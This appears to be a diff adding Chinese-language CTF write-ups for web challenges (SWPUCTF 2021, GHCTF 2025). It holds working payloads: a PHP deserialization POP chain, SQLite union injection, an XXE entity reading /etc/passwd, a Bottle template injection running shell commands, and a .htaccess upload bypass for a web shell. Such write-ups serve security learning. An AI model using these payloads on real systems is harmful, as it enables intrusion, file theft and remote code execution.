@@ -1,5 +1,9 @@
-SWPUCTF 2021 新生赛
+[NSSCTF Web区] 部分 WP 1
 ===
+
+---
+
+# SWPUCTF 2021 新生赛
 
 ## [SWPUCTF 2021 新生赛]gift_F12
 
@@ -272,3 +276,269 @@ echo file_get_contents('flag');
 ```
 
 拼起来: `NSSCTF{73feb461-21b7-4017-8c10-c258c2eb1026}`
+
+## [SWPUCTF 2021 新生赛]pop
+
+### 代码审计
+
+显然是一个反序列化的漏洞。不过这个漏洞要利用不能一步到位, 要后往前推构造一条利用链。
+
+```php
+ <?php
+
+error_reporting(0);
+show_source("index.php");
+
+class w44m{
+
+    private $admin = 'aaa';
+    protected $passwd = '123456';
+
+    public function Getflag(){
+        if($this->admin === 'w44m' && $this->passwd ==='08067'){
+            include('flag.php');
+            echo $flag;
+        }else{
+            echo $this->admin;
+            echo $this->passwd;
+            echo 'nono';
+        }
+    }
+}
+
+class w22m{
+    public $w00m;
+    # __destruct 会在反序列化后直接调用, 因此是第一环
+    public function __destruct(){
+        # echo 处如果是一个对象就会调用__toString
+        echo $this->w00m;
+    }
+}
+
+class w33m{
+    public $w00m;
+    public $w22m;
+    public function __toString(){
+        # 结合前面, 如果 w00m 是对象, 那么 w22m 是对象方法名, 这里调用的实际上是 w00m 的 w22m 方法, 可以是 w44m->Getflag()
+        $this->w00m->{$this->w22m}();
+        return 0;
+    }
+}
+
+$w00m = $_GET['w00m'];
+unserialize($w00m);
+
+?> 
+```
+
+传入 `$w00m` => `$w22m` => `$w33m` => `$w44m`:
+
+具体来说:
+`w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()`
+
+### 构造 payload
+
+```php
+<?php
+class w44m{
+
+    private $admin = 'w44m';
+    protected $passwd = '08067';
+
+}
+
+class w22m{
+    public $w00m;
+}
+
+class w33m{
+    public $w00m;
+    public $w22m;
+
+}
+# w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
+$a = new w22m();
+$b = new w33m();
+$c = new w44m();
+# 入口
+$a->w00m=$b;
+# pop 链子
+$b->w00m=$c;
+$b->w22m='Getflag';
+echo urlencode(serialize($a));
+?>
+```
+
+提交:
+
+![7-1.png](7-1.png)
+
+---
+
+# GHCTF 2025
+
+## [GHCTF 2025]SQL
+
+### 基本探测
+
+拿到发现 URL 里是 GET 传参的 SQL 查询, 尝试:
+
+```
+?id=0 union select 1,2,3,4,5 order by 5--
+```
+
+![8-1.png](8-1.png)
+
+接下来尝试 `database()` 时报错, 可能是 SQLite, 试试 `select sql from sqlite_master`: 
+
+`sqlite_master` 表的结构包含以下几个字段：
+
+- type: 记录项目的类型，如table、index、view、trigger。
+- name: 记录项目的名称，如表名、索引名等。
+- tbl_name: 记录所从属的表名，对于表来说，该列就是表名本身。
+- rootpage: 记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。
+- sql: 记录创建该项目的SQL语句。
+
+比如这个结构:
+
+|type|name|tbl_name|rootpage|sql|
+|----|----|----|----|----|
+|table|employees|employees|2|CREATE TABLEemployees(id INTEGER PRIMARY KEY, name TEXT, dept TEXT, salary REAL)|
+|table|departments|departments|5|CREATE TABLE departments(dept_id INTEGER, dept_name TEXT UNIQUE)|
+|index|sqlite_autoindex_departments_1|departments|8|NULL (自动为 UNIQUE 约束创建的索引)|
+|index|idx_emp_salary|employees|11|CREATE INDEX idx_emp_salary ON employees(salary DESC)|
+|view|high_salary_emp|high_salary_emp|0|CREATE VIEW high_salary_emp AS SELECT * FROM employees WHERE salary > 10000|
+|trigger|audit_emp_update|employees|0|CREATE TRIGGER audit_emp_update AFTER UPDATE ON employees BEGIN INSERT INTO audit_log VALUES(old.id, datetime('now')); END|
+
+![8-2.png](8-2.png)
+
+### SQlite 数字型注入
+
+至此可以确定是 SQLite 数据库且几乎没有过滤, 根据刚刚的结果已经知道了有一张 flag 表, 其只有一列, 名为 flag"
+
+```
+?id=0 union select 1,group_concat(flag),3,4,5 from flag--
+```
+
+爆出 flag;
+
+![8-3.png](8-3.png)
+
+## [GHCTF 2025](>﹏<)
+
+### 源码审计
+
+简单的 flask 应用, 提供了读 xml 功能:
+
+```python
+from flask import Flask,request
+import base64
+from lxml import etree
+import re
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return open(__file__).read()
+
+
+@app.route('/ghctf',methods=['POST'])
+def parse():
+    xml=request.form.get('xml')
+    print(xml)
+    if xml is None:
+        return "No System is Safe."
+    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
+    root = etree.fromstring(xml, parser)
+    name=root.find('name').text
+    return name or None
+
+
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=8080)
+```
+
+关键方法:
+
+`etree.XMLParser` 是 lxml.etree 模块中的一个类，用于自定义 XML 解析行为。
+
+```python
+from lxml import etree
+
+parser = etree.XMLParser(
+    encoding=None,                # 指定编码
+    recover=False,                # 是否自动修复损坏的 XML
+    remove_blank_text=False,      # 是否移除空白文本节点
+    remove_comments=False,        # 是否移除注释
+    remove_pis=False,             # 是否移除处理指令
+    strip_cdata=True,             # 是否将 CDATA 区域转为普通文本
+    resolve_entities=True,        # 是否解析实体（XXE 漏洞相关）
+    load_dtd=False,               # 是否加载 DTD
+    no_network=False,             # 是否允许网络加载 DTD
+)
+tree = etree.fromstring(xml_string, parser)
+```
+
+resolve_entities=True 和 load_dtd=True 可能导致 XXE 漏洞。
+
+### XXE 漏洞
+
+当上文两项都为 True, 将可以解析 XML 中的外部协议, 例如经典的 payload:
+
+```
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>
+  <name>&xxe;</name>
+</root>
+```
+
+这里要 POST 传参, 那么将该 XML payload URL 编码后传入即可:
+
+![9-1.png](9-1.png)
+
+## [GHCTF 2025]Message in a Bottle plus
+
+### 题解
+
+打开是个留言板, 尝试 SQL 注入无果, SSTI 发现 `{}` `()` 均被过滤了, 根据题目名字想到 bottle 模板:
+
+Bottle 模板中 (SimpleTemplate), 行首的 `%` 表示 Python 语句, 仅执行, `{{ ... }}` 表示 Python 表达式, 而普通字符串会被原样输出。
+
+需要注意的是, 由 `<div>` + `</div>` 或者 `"""` 包裹的字符串会被视为普通字符串, 然而其中包含的 `% expression` 语句依然会被解析, 这里尖括号被过滤, 因此使用这个 payload 就可以绕过:
+
+```python
+"""
+ % import os
+ % flag_data = os.popen("cat /f*").read()
+ % __import__('bottle').abort(200, flag_data)
+"""
+```
+
+![10-1.png](10-1.png)
+
+## [GHCTF 2025]UPUPUP
+
+### 题解
+
+打开发现是个文件上传界面, 那还是老规矩, 直接传 shell.php 是不行的, 尝试改文件头, 依然不行, 可能是文件后缀做了黑名单, 只能传个 shell.jpg 上去:
+
+> `.php3`, `.phtml` 等也被拦了; 
+
+![11-1.png](11-1.png)
+
+那么下一步考虑一下能不能传 `.htaccess`:
+
+直接上传不允许, 修改包里的文件类型并加个前缀后就通过了;
+
+![11-2.png](11-2.png)
+
+并且两个文件在同一个目录下, 那可以直接蚁剑连上;
+
+![11-3.png](11-3.png)
+
+![11-4.png](11-4.png)
+
+---
+
+~做到这里金币花完了, 过几天继续好了。~
